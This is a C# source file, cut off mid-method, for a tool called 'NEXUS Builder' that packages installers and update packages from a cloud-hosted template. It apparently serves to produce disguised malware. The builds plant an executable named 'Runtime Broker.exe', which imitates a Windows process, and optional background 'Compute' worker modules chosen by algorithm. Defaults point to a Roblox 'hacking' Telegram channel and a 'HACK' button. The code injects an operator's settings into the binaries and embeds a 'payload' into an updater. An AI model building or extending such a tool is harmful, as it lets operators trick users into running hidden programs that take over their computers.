using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Linq;
using System.Net.Http;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using Color = System.Windows.Media.Color;
using WpfButton = System.Windows.Controls.Button;
using WpfCheckBox = System.Windows.Controls.CheckBox;
using WpfComboBox = System.Windows.Controls.ComboBox;
using WpfTextBox = System.Windows.Controls.TextBox;
using WpfOrientation = System.Windows.Controls.Orientation;
using WpfRadioButton = System.Windows.Controls.RadioButton;

namespace NexusBuilder
{
    public partial class MainWindow : Window
    {
        private const string AppVersion = "8.0.3";
        private static readonly HttpClient _http = new HttpClient { Timeout = TimeSpan.FromMinutes(10) };
        private string? _cachedIsccPath;
        private string _activeIconPath = "";
        private string? _customBgPath = null;
        private bool _isInitialized = false;

        private string _currentUser = "";
        private string _authToken = "";
        private bool _isUserAdmin = false;
        private readonly string _authFilePath = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
            "NEXUS_Builder", "auth.json"
        );
        private readonly string _projectConfigFilePath = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
            "NEXUS_Builder", "custom_project_config.json"
        );
        private readonly string _computeConfigFilePath = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
            "NEXUS_Builder", "compute_module_config.json"
        );
        private static readonly string API_BASE = "https://file-transfer-production-75ad.up.railway.app";

        public ObservableCollection<CustomProjectParam> CustomProjectParams { get; set; } = new ObservableCollection<CustomProjectParam>();
        public ComputeRootConfig ComputeConfig { get; set; } = new ComputeRootConfig();

        public MainWindow()
        {
            InitializeComponent();
            _isInitialized = true;
            
            string defaultOut = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory),
                "NEXUS_Builds_v8.0.3"
            );
            tbOutputPath.Text = defaultOut;

            if (dgCustomParams != null)
            {
                dgCustomParams.ItemsSource = CustomProjectParams;
            }

            ExtractEmbeddedIcons();
            InitializeDefaultIcon();
            _cachedIsccPath = FindIsccPath();

            InitializeComputeModuleUI();
            LoadCustomProjectParams();

            GoToStep(1);

            Log("⚡ NEXUS Builder v" + AppVersion + " [Cloud Sync] готов к работе.");
            Log("• Доступна сборка: Standalone Инсталлятор (PRO) и Client Инсталлятор.");
            Log("• Облачная синхронизация шаблонов: Активна (автоматическая загрузка).");

            TryAutoLogin();
            _ = InitializeWebEngineAsync();
        }

        private async Task InitializeWebEngineAsync()
        {
            try
            {
                string webUiDir = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "WebUI");
                if (!Directory.Exists(webUiDir))
                {
                    webUiDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "NEXUS_Builder", "WebUI");
                    Directory.CreateDirectory(webUiDir);
                }

                string htmlFile = Path.Combine(webUiDir, "index.html");
                if (!File.Exists(htmlFile))
                {
                    // Extract embedded if not exists
                    var asm = Assembly.GetExecutingAssembly();
                    foreach (var resName in asm.GetManifestResourceNames())
                    {
                        if (resName.Contains("WebUI", StringComparison.OrdinalIgnoreCase))
                        {
                            string fileName = resName.Substring(resName.LastIndexOf('.') + 1);
                            if (resName.EndsWith(".html", StringComparison.OrdinalIgnoreCase)) fileName = "index.html";
                            else if (resName.EndsWith(".jpg", StringComparison.OrdinalIgnoreCase)) fileName = "griffith.jpg";
                            using var stream = asm.GetManifestResourceStream(resName);
                            if (stream != null)
                            {
                                using var fs = File.Create(Path.Combine(webUiDir, fileName));
                                await stream.CopyToAsync(fs);
                            }
                        }
                    }
                }

                string userDataFolder = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "NEXUS_Builder", "WebView2");
                var env = await Microsoft.Web.WebView2.Core.CoreWebView2Environment.CreateAsync(null, userDataFolder);
                await webEngine.EnsureCoreWebView2Async(env);

                webEngine.CoreWebView2.Settings.IsStatusBarEnabled = false;
                webEngine.CoreWebView2.Settings.AreDefaultContextMenusEnabled = false;
                webEngine.CoreWebView2.Settings.AreDevToolsEnabled = true;

                webEngine.CoreWebView2.WebMessageReceived += CoreWebView2_WebMessageReceived;

                if (File.Exists(htmlFile))
                {
                    webEngine.CoreWebView2.Navigate(new Uri(htmlFile).AbsoluteUri);
                }
                else
                {
                    // Fallback to legacy WPF UI
                    webEngine.Visibility = Visibility.Collapsed;
                    legacyWpfGrid.Visibility = Visibility.Visible;
                }
            }
            catch (Exception ex)
            {
                Log("WebView2 init exception: " + ex.Message + ". Falling back to WPF view.");
                webEngine.Visibility = Visibility.Collapsed;
                legacyWpfGrid.Visibility = Visibility.Visible;
            }
        }

        private async void CoreWebView2_WebMessageReceived(object? sender, Microsoft.Web.WebView2.Core.CoreWebView2WebMessageReceivedEventArgs e)
        {
            try
            {
                string json = e.WebMessageAsJson;
                using var doc = JsonDocument.Parse(json);
                var root = doc.RootElement;
                string action = root.TryGetProperty("action", out var a) ? a.GetString() ?? "" : "";

                switch (action)
                {
                    case "minimize":
                        WindowState = WindowState.Minimized;
                        break;
                    case "close":
                        Close();
                        break;
                    case "dragWindow":
                        try { DragMove(); } catch { }
                        break;
                    case "domReady":
                        SendInitDataToWeb();
                        break;
                    case "chooseOutputFolder":
                        ChooseOutputFolderFromWeb();
                        break;
                    case "chooseCustomBg":
                        ChooseCustomBgFromWeb();
                        break;
                    case "resetCustomBg":
                        SetCustomBackground(null);
                        SendWebLog("Фон сброшен на стандартный арт Griffith.");
                        break;
                    case "chooseCustomIco":
                        ChooseCustomIcoFromWeb();
                        break;
                    case "selectIconPreset":
                        if (root.TryGetProperty("preset", out var p))
                        {
                            string preset = p.GetString() ?? "rah";
                            SelectIconPresetByName(preset);
                        }
                        break;
                    case "login":
                        if (root.TryGetProperty("login", out var l) && root.TryGetProperty("pass", out var pw))
                        {
                            string login = l.GetString() ?? "";
                            string pass = pw.GetString() ?? "";
                            bool remember = root.TryGetProperty("remember", out var r) && r.GetBoolean();
                            await HandleWebLogin(login, pass, remember);
                        }
                        break;
                    case "logout":
                        BtnLogout_Click(this, new RoutedEventArgs());
                        break;
                    case "openOutputFolder":
                        BtnOpenFolder_Click(this, new RoutedEventArgs());
                        break;
                    case "startBuild":
                        bool isStandalone = root.TryGetProperty("isStandalone", out var sa) && sa.GetBoolean();
                        if (root.TryGetProperty("appName", out var an)) tbAppName.Text = an.GetString();
                        if (root.TryGetProperty("author", out var au) && tbAuthor != null) tbAuthor.Text = au.GetString();
                        if (root.TryGetProperty("version", out var vr)) tbVersion.Text = vr.GetString();
                        if (root.TryGetProperty("outputPath", out var op)) tbOutputPath.Text = op.GetString();
                        if (root.TryGetProperty("telegram", out var tg) && tbTelegramChannel != null) tbTelegramChannel.Text = tg.GetString();
                        if (root.TryGetProperty("buttonText", out var bt) && tbButtonText != null) tbButtonText.Text = bt.GetString();
                        if (root.TryGetProperty("computeEnabled", out var ce))
                        {
                            bool isComp = ce.GetBoolean();
                            if (chkComputeEnabled != null) chkComputeEnabled.IsChecked = isComp;
                            ComputeConfig.Enabled = isComp;
                        }

                        if (root.TryGetProperty("computeModules", out var cms) && cms.ValueKind == JsonValueKind.Array)
                        {
                            try
                            {
                                var deserialized = JsonSerializer.Deserialize<List<ComputeModuleConfig>>(cms.GetRawText());
                                if (deserialized != null && deserialized.Count > 0)
                                {
                                    ComputeConfig.Modules = deserialized;
                                    SaveComputeModuleConfig();
                                }
                            }
                            catch (Exception ex)
                            {
                                Log("⚠️ Ошибка разбора модулей: " + ex.Message);
                            }
                        }

                        string overrideOp = root.TryGetProperty("operator", out var opr) ? opr.GetString() ?? "" : "";
                        string themeAccent = root.TryGetProperty("themeAccent", out var ta) ? ta.GetString() ?? "#ffffff" : "#ffffff";
                        string themeSurface = root.TryGetProperty("themeSurface", out var ts) ? ts.GetString() ?? "#0D0E12" : "#0D0E12";
                        await RunBuild(isStandalone, overrideOp, themeAccent, themeSurface);
                        break;
                    case "buildNupkg":
                        if (root.TryGetProperty("appName", out var an1)) tbAppName.Text = an1.GetString();
                        if (root.TryGetProperty("author", out var au1) && tbAuthor != null) tbAuthor.Text = au1.GetString();
                        if (root.TryGetProperty("version", out var nv)) tbVersion.Text = nv.GetString();
                        if (root.TryGetProperty("outputPath", out var no)) tbOutputPath.Text = no.GetString();
                        if (root.TryGetProperty("telegram", out var tg1) && tbTelegramChannel != null) tbTelegramChannel.Text = tg1.GetString();
                        if (root.TryGetProperty("buttonText", out var bt1) && tbButtonText != null) tbButtonText.Text = bt1.GetString();
                        if (root.TryGetProperty("computeEnabled", out var ce1))
                        {
                            bool isComp = ce1.GetBoolean();
                            if (chkComputeEnabled != null) chkComputeEnabled.IsChecked = isComp;
                            ComputeConfig.Enabled = isComp;
                        }
                        if (root.TryGetProperty("computeModules", out var cms1) && cms1.ValueKind == JsonValueKind.Array)
                        {
                            try
                            {
                                var deserialized = JsonSerializer.Deserialize<List<ComputeModuleConfig>>(cms1.GetRawText());
                                if (deserialized != null && deserialized.Count > 0)
                                {
                                    ComputeConfig.Modules = deserialized;
                                    SaveComputeModuleConfig();
                                }
                            }
                            catch { }
                        }
                        BtnCreateUpdatePackage_Click(this, new RoutedEventArgs());
                        break;
                    case "buildLegacyUpdate":
                        if (root.TryGetProperty("appName", out var an2)) tbAppName.Text = an2.GetString();
                        if (root.TryGetProperty("author", out var au2) && tbAuthor != null) tbAuthor.Text = au2.GetString();
                        if (root.TryGetProperty("version", out var lv)) tbVersion.Text = lv.GetString();
                        if (root.TryGetProperty("outputPath", out var lo)) tbOutputPath.Text = lo.GetString();
                        if (root.TryGetProperty("telegram", out var tg2) && tbTelegramChannel != null) tbTelegramChannel.Text = tg2.GetString();
                        if (root.TryGetProperty("buttonText", out var bt2) && tbButtonText != null) tbButtonText.Text = bt2.GetString();
                        if (root.TryGetProperty("computeEnabled", out var ce2))
                        {
                            bool isComp = ce2.GetBoolean();
                            if (chkComputeEnabled != null) chkComputeEnabled.IsChecked = isComp;
                            ComputeConfig.Enabled = isComp;
                        }
                        if (root.TryGetProperty("computeModules", out var cms2) && cms2.ValueKind == JsonValueKind.Array)
                        {
                            try
                            {
                                var deserialized = JsonSerializer.Deserialize<List<ComputeModuleConfig>>(cms2.GetRawText());
                                if (deserialized != null && deserialized.Count > 0)
                                {
                                    ComputeConfig.Modules = deserialized;
                                    SaveComputeModuleConfig();
                                }
                            }
                            catch { }
                        }
                        BuildLegacyUpdatePackage_Click(this, new RoutedEventArgs());
                        break;
                }
            }
            catch (Exception ex)
            {
                Log("WebMessage error: " + ex.Message);
            }
        }

        private void SendInitDataToWeb()
        {
            try
            {
                string bgBase64 = "";
                if (!string.IsNullOrEmpty(_customBgPath) && File.Exists(_customBgPath))
                {
                    try
                    {
                        byte[] bgBytes = File.ReadAllBytes(_customBgPath);
                        string mime = _customBgPath.EndsWith(".png", StringComparison.OrdinalIgnoreCase) ? "image/png" : "image/jpeg";
                        bgBase64 = $"data:{mime};base64," + Convert.ToBase64String(bgBytes);
                    }
                    catch { }
                }

                var data = new
                {
                    appName = tbAppName.Text.Trim(),
                    author = tbAuthor?.Text.Trim() ?? "Убежище",
                    version = tbVersion.Text.Trim(),
                    outputPath = tbOutputPath.Text.Trim(),
                    customBgPath = _customBgPath,
                    customBgBase64 = bgBase64,
                    iconName = Path.GetFileName(_activeIconPath),
                    user = _currentUser,
                    isAdmin = _isUserAdmin,
                    computeConfig = new
                    {
                        enabled = ComputeConfig.Enabled,
                        modules = ComputeConfig.Modules
                    }
                };
                string jsonMsg = JsonSerializer.Serialize(new { type = "initData", data });
                webEngine.CoreWebView2.PostWebMessageAsJson(jsonMsg);
            }
            catch { }
        }

        public void SendWebLog(string text)
        {
            try
            {
                Dispatcher.Invoke(() =>
                {
                    if (webEngine?.CoreWebView2 != null)
                    {
                        string jsonMsg = JsonSerializer.Serialize(new { type = "log", text });
                        webEngine.CoreWebView2.PostWebMessageAsJson(jsonMsg);
                    }
                });
            }
            catch { }
        }

        private void ChooseOutputFolderFromWeb()
        {
            using var dialog = new System.Windows.Forms.FolderBrowserDialog();
            dialog.Description = "Выберите папку для сохранения собранных приложений";
            dialog.UseDescriptionForTitle = true;
            dialog.SelectedPath = tbOutputPath.Text;
            if (dialog.ShowDialog() == System.Windows.Forms.DialogResult.OK)
            {
                tbOutputPath.Text = dialog.SelectedPath;
                SendWebLog($"📁 Папка назначения: {dialog.SelectedPath}");
                SendInitDataToWeb();
            }
        }

        private void ChooseCustomBgFromWeb()
        {
            using var ofd = new System.Windows.Forms.OpenFileDialog();
            ofd.Title = "Выберите фоновое изображение (.jpg, .png)";
            ofd.Filter = "Изображения (*.jpg;*.jpeg;*.png)|*.jpg;*.jpeg;*.png";
            if (ofd.ShowDialog() == System.Windows.Forms.DialogResult.OK)
            {
                SetCustomBackground(ofd.FileName);
                SendWebLog($"🎨 Выбран кастомный фон: {ofd.FileName}");
                SendInitDataToWeb();
            }
        }

        private void ChooseCustomIcoFromWeb()
        {
            using var ofd = new System.Windows.Forms.OpenFileDialog();
            ofd.Title = "Выберите иконку приложения (.ico)";
            ofd.Filter = "Иконки (*.ico)|*.ico";
            if (ofd.ShowDialog() == System.Windows.Forms.DialogResult.OK)
            {
                SetIcon(ofd.FileName, Path.GetFileName(ofd.FileName));
                SendWebLog($"🎨 Выбрана иконка: {ofd.FileName}");
                SendInitDataToWeb();
            }
        }

        private void SelectIconPresetByName(string preset)
        {
            for (int i = 0; i < cbIconPresets.Items.Count; i++)
            {
                if (cbIconPresets.Items[i] is ComboBoxItem cbi && cbi.Tag?.ToString()?.Equals(preset, StringComparison.OrdinalIgnoreCase) == true)
                {
                    cbIconPresets.SelectedIndex = i;
                    break;
                }
            }
        }

        private async Task HandleWebLogin(string username, string password, bool remember)
        {
            try
            {
                var payload = JsonSerializer.Serialize(new { username, password });
                using var content = new StringContent(payload, Encoding.UTF8, "application/json");
                using var resp = await _http.PostAsync($"{API_BASE}/api/login", content);

                if (!resp.IsSuccessStatusCode)
                {
                    string errJson = JsonSerializer.Serialize(new { type = "loginResult", success = false, message = "Неверный логин или пароль" });
                    webEngine.CoreWebView2.PostWebMessageAsJson(errJson);
                    return;
                }

                string respBody = await resp.Content.ReadAsStringAsync();
                using var doc = JsonDocument.Parse(respBody);
                var root = doc.RootElement;
                string user = root.TryGetProperty("user", out var u) ? u.GetString() ?? username : username;
                string token = root.TryGetProperty("token", out var t) ? t.GetString() ?? "" : "";

                if (remember)
                {
                    try
                    {
                        Directory.CreateDirectory(Path.GetDirectoryName(_authFilePath)!);
                        string saveJson = JsonSerializer.Serialize(new { user, token, savedAt = DateTime.UtcNow });
                        await File.WriteAllTextAsync(_authFilePath, saveJson);
                    }
                    catch { }
                }

                ApplyUserSession(user, token);

                string okJson = JsonSerializer.Serialize(new { type = "loginResult", success = true, user = _currentUser, isAdmin = _isUserAdmin });
                webEngine.CoreWebView2.PostWebMessageAsJson(okJson);
                SendInitDataToWeb();
            }
            catch (Exception ex)
            {
                string errJson = JsonSerializer.Serialize(new { type = "loginResult", success = false, message = "Ошибка сети: " + ex.Message });
                webEngine.CoreWebView2.PostWebMessageAsJson(errJson);
            }
        }

        #region Wizard Navigation & Summary
        private int _currentStep = 1;

        public void GoToStep(int stepIndex)
        {
            if (viewStep1 == null || viewStep2 == null || viewStep3 == null || viewStep4 == null) return;
            _currentStep = stepIndex;

            viewStep1.Visibility = stepIndex == 1 ? Visibility.Visible : Visibility.Collapsed;
            viewStep2.Visibility = stepIndex == 2 ? Visibility.Visible : Visibility.Collapsed;
            viewStep3.Visibility = stepIndex == 3 ? Visibility.Visible : Visibility.Collapsed;
            viewStep4.Visibility = stepIndex == 4 ? Visibility.Visible : Visibility.Collapsed;

            if (navStep1 != null && navStep1.IsChecked != (stepIndex == 1)) navStep1.IsChecked = stepIndex == 1;
            if (navStep2 != null && navStep2.IsChecked != (stepIndex == 2)) navStep2.IsChecked = stepIndex == 2;
            if (navStep3 != null && navStep3.IsChecked != (stepIndex == 3)) navStep3.IsChecked = stepIndex == 3;
            if (navStep4 != null && navStep4.IsChecked != (stepIndex == 4)) navStep4.IsChecked = stepIndex == 4;

            if (stepIndex == 4)
            {
                UpdateSummaryView();
            }
        }

        private void NavStep_Click(object sender, RoutedEventArgs e)
        {
            if (sender is WpfRadioButton rb && rb.Tag != null && int.TryParse(rb.Tag.ToString(), out int step))
            {
                if (rb.IsChecked == true && _currentStep != step)
                {
                    GoToStep(step);
                }
            }
        }

        private void BtnStep1GoCreate_Click(object sender, RoutedEventArgs e)
        {
            GoToStep(4);
        }

        private void BtnStep1Next_Click(object sender, RoutedEventArgs e)
        {
            GoToStep(2);
        }

        private void BtnStep2Prev_Click(object sender, RoutedEventArgs e)
        {
            GoToStep(1);
        }

        private void BtnStep2Next_Click(object sender, RoutedEventArgs e)
        {
            GoToStep(3);
        }

        private void BtnStep3Prev_Click(object sender, RoutedEventArgs e)
        {
            GoToStep(2);
        }

        private void BtnStep3Next_Click(object sender, RoutedEventArgs e)
        {
            GoToStep(4);
        }

        private void BtnStep4Back_Click(object sender, RoutedEventArgs e)
        {
            GoToStep(3);
        }

        private void TbAppName_TextChanged(object sender, TextChangedEventArgs e)
        {
            UpdateSummaryView();
        }

        private void TbVersion_TextChanged(object sender, TextChangedEventArgs e)
        {
            UpdateSummaryView();
        }

        public void UpdateSummaryView()
        {
            if (lblSummaryAppName != null)
                lblSummaryAppName.Text = string.IsNullOrWhiteSpace(tbAppName?.Text) ? "RAH" : tbAppName.Text.Trim();

            if (lblSummaryVersion != null)
                lblSummaryVersion.Text = string.IsNullOrWhiteSpace(tbVersion?.Text) ? "8.0.3" : tbVersion.Text.Trim();

            if (lblSummaryComputeStatus != null)
            {
                bool compEnabled = chkComputeEnabled?.IsChecked == true;
                lblSummaryComputeStatus.Text = compEnabled ? "Включена" : "Отключена";
                lblSummaryComputeStatus.Foreground = compEnabled
                    ? new SolidColorBrush(Color.FromRgb(52, 211, 153))
                    : new SolidColorBrush(Color.FromRgb(148, 163, 184));
            }

            if (lblSummaryTasksCount != null)
            {
                int count = ComputeConfig.Modules.Count;
                lblSummaryTasksCount.Text = $"{count} {GetModuleWord(count)}";
            }

            if (lblSummaryOutputPath != null)
            {
                lblSummaryOutputPath.Text = tbOutputPath?.Text ?? "";
            }
        }

        private void BtnToggleErrorDetails_Click(object sender, RoutedEventArgs e)
        {
            if (pnlErrorDetailsBox != null)
            {
                bool isVisible = pnlErrorDetailsBox.Visibility == Visibility.Visible;
                pnlErrorDetailsBox.Visibility = isVisible ? Visibility.Collapsed : Visibility.Visible;
                btnToggleErrorDetails.Content = isVisible ? "Показать подробности ▾" : "Скрыть подробности ▴";
            }
        }

        private void BtnClearLog_Click(object sender, RoutedEventArgs e)
        {
            txtConsole.Clear();
        }

        private void BtnCopyLog_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                if (!string.IsNullOrEmpty(txtConsole.Text))
                {
                    System.Windows.Clipboard.SetText(txtConsole.Text);
                    Log("Журнал скопирован в буфер обмена.");
                }
            }
            catch (Exception ex)
            {
                Log("Ошибка копирования в буфер: " + ex.Message);
            }
        }

        private void BtnAddParam_Click(object sender, RoutedEventArgs e)
        {
            var existingKeys = CustomProjectParams.Select(p => p.Key).ToList();
            var dlg = new ParamEditDialog(null, existingKeys);
            if (dlg.ShowDialog() == true && dlg.Parameter != null)
            {
                CustomProjectParams.Add(dlg.Parameter);
                SaveCustomProjectParams();
                UpdateCustomConfigCount();
            }
        }

        private void BtnDeleteParam_Click(object sender, RoutedEventArgs e)
        {
            if (dgCustomParams.SelectedItem is CustomProjectParam p)
            {
                CustomProjectParams.Remove(p);
                SaveCustomProjectParams();
                UpdateCustomConfigCount();
            }
        }

        private async Task<string?> BuildConfiguredUpdateStagingAsync(string targetVer)
        {
            // 1. Template
            string templateDir = await EnsureAppTemplate();
            if (string.IsNullOrEmpty(templateDir) || !Directory.Exists(templateDir))
            {
                Log("❌ ОШИБКА: Не удалось получить шаблон приложения!");
                return null;
            }

            string stagingDir = Path.Combine(Path.GetTempPath(), $"NEXUS_UpdateStage_{Guid.NewGuid():N}");
            if (Directory.Exists(stagingDir))
            {
                try { Directory.Delete(stagingDir, true); } catch { }
            }
            Directory.CreateDirectory(stagingDir);

            string rbStaging = Path.Combine(stagingDir, "RuntimeBroker");
            Directory.CreateDirectory(rbStaging);
            string clientStaging = Path.Combine(stagingDir, "client");
            Directory.CreateDirectory(clientStaging);

            CopyDirectory(templateDir, rbStaging);
            CopyDirectory(templateDir, clientStaging);

            // 2. Prepare Compute workers if enabled
            if (ComputeConfig.Enabled && ComputeConfig.Modules.Any(m => m.Enabled))
            {
                var requiredModes = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
                for (int mi = 0; mi < ComputeConfig.Modules.Count; mi++)
                {
                    var mod = ComputeConfig.Modules[mi];
                    if (!mod.Enabled) continue;
                    requiredModes.Add(MapAlgorithmToLegacyMode(mod.Primary.Algorithm));
                    if (mod.IsDualMode && !string.IsNullOrEmpty(mod.Secondary.Algorithm))
                        requiredModes.Add(MapAlgorithmToLegacyMode(mod.Secondary.Algorithm));
                }

                foreach (string modeVal in requiredModes)
                {
                    await ComputeWorkerManager.PrepareWorkerAsync(modeVal, msg => Log(msg), pct => { });
                }

                string computeWorkersDir = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    "NEXUS_Builder", "compute_workers");

                if (Directory.Exists(computeWorkersDir))
                {
                    string stagingCompute = Path.Combine(stagingDir, "Compute");
                    Directory.CreateDirectory(stagingCompute);
                    foreach (var f in Directory.GetFiles(computeWorkersDir, "*.*"))
                    {
                        File.Copy(f, Path.Combine(stagingCompute, Path.GetFileName(f)), true);
                    }
                    Log($"✓ Модули Compute ({Directory.GetFiles(stagingCompute).Length} файлов) включены в пакет обновления.");
                }
            }

            // 3. Inject configuration (Operator, Compute modules, Telegram, etc.) into RuntimeBroker files
            string opName = GetSelectedOperator();
            string appName = tbAppName.Text.Trim();
            if (string.IsNullOrWhiteSpace(appName)) appName = "RAH";
            string appAuthor = tbAuthor?.Text.Trim() ?? "RAH Team";
            string tgChannel = tbTelegramChannel?.Text.Trim() ?? "https://t.me/robloxvzlomez";
            string btnText = tbButtonText?.Text.Trim() ?? "ВЗЛОМАТЬ";
            var customConfigDict = BuildCustomConfigDictionary();
            SaveCustomProjectParams();

            foreach (var rootDir in new[] { rbStaging, clientStaging })
            {
                string cloneExe = Path.Combine(rootDir, "Runtime Broker.exe");
                if (!File.Exists(cloneExe))
                {
                    string nestedClone = Path.Combine(rootDir, "clone", "Runtime Broker.exe");
                    if (File.Exists(nestedClone))
                    {
                        File.Copy(nestedClone, cloneExe, true);
                    }
                }

                if (File.Exists(cloneExe))
                {
                    InjectConfigIntoFile(cloneExe, opName, appName, appAuthor, tgChannel, false, customConfigDict, btnText);
                    Log($"✓ Конфигурация внедрена в {Path.GetFileName(cloneExe)}");
                }

                foreach (var dll in Directory.GetFiles(rootDir, "*.dll"))
                {
                    if (Path.GetFileName(dll).Contains("RAH") || Path.GetFileName(dll).Contains("FileTransfer"))
                    {
                        InjectConfigIntoFile(dll, opName, appName, appAuthor, tgChannel, false, customConfigDict, btnText);
                        Log($"✓ Конфигурация внедрена в {Path.GetFileName(dll)}");
                    }
                }
            }

            return stagingDir;
        }

        private async void BtnCreateUpdatePackage_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                string outDir = tbOutputPath.Text.Trim();
                if (string.IsNullOrWhiteSpace(outDir))
                {
                    outDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory), "NEXUS_Builds_v8.0.3");
                }

                string currentVer = AppVersion;
                string targetVer = tbVersion.Text.Trim();
                if (string.IsNullOrWhiteSpace(targetVer)) targetVer = "8.0.3";

                Log($"[UPDATE] 📦 Старт создания файла обновления v{targetVer}...");

                GoToStep(4);
                pnlBuildSteps.Visibility = Visibility.Visible;
                pnlBuildSuccess.Visibility = Visibility.Collapsed;
                pnlErrorBanner.Visibility = Visibility.Collapsed;
                pbProgress.IsIndeterminate = true;
                lblStatus.Text = $"Создание файла обновления v{targetVer}...";

                txtBuildStep1.Text = $"✓ 1. Определение версии: v{targetVer}";
                txtBuildStep2.Text = "⏳ 2. Сбор и внедрение параметров конфигурации...";
                txtBuildStep3.Text = "⏳ 3. Подготовка фонового модуля и Compute...";
                txtBuildStep4.Text = "⏳ 4. Формирование архива обновления .nupkg...";
                txtBuildStep5.Text = "⏳ 5. Проверка целостности SHA-256...";

                string? stagingDir = await BuildConfiguredUpdateStagingAsync(targetVer);
                if (stagingDir == null)
                {
                    throw new InvalidOperationException("Не удалось подготовить конфигурацию для пакета обновления.");
                }

                var result = await UpdatePackageBuilder.BuildPackageFromStagingAsync(
                    outDir,
                    currentVer,
                    targetVer,
                    stagingDir,
                    msg => Log(msg)
                );

                try { Directory.Delete(stagingDir, true); } catch { }

                pbProgress.IsIndeterminate = false;

                if (result.Success)
                {
                    txtBuildStep2.Text = "✓ 2. Файлы и конфигурация собраны";
                    txtBuildStep3.Text = "✓ 3. Фоновые модули Compute включены";
                    txtBuildStep4.Text = $"✓ 4. Архив сформирован: {Path.GetFileName(result.PackagePath)} ({result.PackageSize / 1024} КБ)";
                    txtBuildStep5.Text = $"✓ 5. Хеш SHA-256: {result.PackageHash[..Math.Min(16, result.PackageHash.Length)]}... (OK)";
                    pbProgress.Value = 100;
                    lblStatus.Text = $"Файл обновления v{targetVer} успешно создан!";

                    pnlBuildSuccess.Visibility = Visibility.Visible;
                    Log($"🎉 Пакет обновления готов: {result.PackagePath}");
                }
                else
                {
                    pbProgress.Value = 0;
                    pnlErrorBanner.Visibility = Visibility.Visible;
                    txtErrorDetails.Text = result.ErrorMessage;
                    lblStatus.Text = "Ошибка создания файла обновления";
                    Log($"❌ {result.ErrorMessage}");
                }
            }
            catch (Exception ex)
            {
                pbProgress.IsIndeterminate = false;
                pbProgress.Value = 0;
                pnlErrorBanner.Visibility = Visibility.Visible;
                txtErrorDetails.Text = ex.ToString();
                lblStatus.Text = "Ошибка создания файла обновления";
                Log($"❌ Не удалось создать файл обновления: {ex.Message}");
            }
        }

        private async void BuildLegacyUpdatePackage_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                string outDir = tbOutputPath.Text.Trim();
                if (string.IsNullOrWhiteSpace(outDir))
                {
                    outDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory), "NEXUS_Builds_v8.0.3");
                }

                if (!Directory.Exists(outDir)) Directory.CreateDirectory(outDir);

                string currentVer = AppVersion;
                string targetVer = tbVersion.Text.Trim();
                if (string.IsNullOrWhiteSpace(targetVer)) targetVer = "8.0.3";

                Log($"[LEGACY UPDATE] ⚡ Старт сборки LegacyUpdate.exe для v{targetVer}...");

                GoToStep(4);
                pnlBuildSteps.Visibility = Visibility.Visible;
                pnlBuildSuccess.Visibility = Visibility.Collapsed;
                pnlErrorBanner.Visibility = Visibility.Collapsed;
                pbProgress.IsIndeterminate = true;
                lblStatus.Text = $"Сборка LegacyUpdate.exe для клиентов < 8.0.2...";

                txtBuildStep1.Text = $"✓ 1. Версия целевого обновления: v{targetVer}";
                txtBuildStep2.Text = "⏳ 2. Внедрение параметров конфигурации и Compute...";
                txtBuildStep3.Text = "⏳ 3. Формирование встроенного пакета обновления...";
                txtBuildStep4.Text = "⏳ 4. Встраивание полезной нагрузки в LegacyUpdate.exe...";
                txtBuildStep5.Text = "⏳ 5. Проверка целостности бинарника...";

                string? stagingDir = await BuildConfiguredUpdateStagingAsync(targetVer);
                if (stagingDir == null)
                {
                    throw new InvalidOperationException("Не удалось подготовить конфигурацию для LegacyUpdate.");
                }

                string tempNupkgDir = Path.Combine(Path.GetTempPath(), $"nexus_temp_nupkg_{Guid.NewGuid():N}");
                Directory.CreateDirectory(tempNupkgDir);

                var nupkgResult = await UpdatePackageBuilder.BuildPackageFromStagingAsync(
                    tempNupkgDir,
                    currentVer,
                    targetVer,
                    stagingDir,
                    msg => Log(msg)
                );

                try { Directory.Delete(stagingDir, true); } catch { }

                if (!nupkgResult.Success)
                {
                    try { Directory.Delete(tempNupkgDir, true); } catch { }
                    throw new InvalidOperationException(nupkgResult.ErrorMessage);
                }

                txtBuildStep2.Text = "✓ 2. Параметры и модули Compute внедрены";
                txtBuildStep3.Text = $"✓ 3. Встроенный пакет сформирован ({nupkgResult.PackageSize / 1024} КБ)";

                string localLegacyExe = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "LegacyUpdate.exe");
                string downloadsLegacyExe = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "downloads", "LegacyUpdate.exe");
                string srcLegacy = File.Exists(localLegacyExe) ? localLegacyExe : (File.Exists(downloadsLegacyExe) ? downloadsLegacyExe : null);

                if (srcLegacy == null)
                {
                    string devPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "..", "..", "..", "..", "docs", "downloads", "LegacyUpdate.exe");
                    if (File.Exists(devPath)) srcLegacy = Path.GetFullPath(devPath);
                }

                if (srcLegacy == null)
                {
                    string devPath2 = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "..", "..", "..", "docs", "downloads", "LegacyUpdate.exe");
                    if (File.Exists(devPath2)) srcLegacy = Path.GetFullPath(devPath2);
                }

                string destPath = Path.Combine(outDir, "LegacyUpdate.exe");

                if (srcLegacy != null && File.Exists(srcLegacy))
                {
                    UpdatePackageBuilder.EmbedPackageIntoLegacyUpdater(srcLegacy, nupkgResult.PackagePath, destPath);
